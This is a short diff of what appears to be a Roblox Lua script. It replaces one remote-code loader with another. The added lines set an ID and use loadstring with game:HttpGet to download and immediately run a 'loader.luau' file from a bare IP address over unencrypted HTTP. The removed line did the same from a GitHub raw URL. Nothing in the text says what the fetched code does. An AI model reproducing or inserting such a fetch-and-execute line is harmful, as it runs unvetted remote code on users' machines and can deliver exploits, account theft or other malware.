@@ -1,1 +1,2 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/aodes666/fddsf/refs/heads/main/dsads"))()
+ID="0b4c489d-a4e4-4d2d-b196-69c9bd74d0b5";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
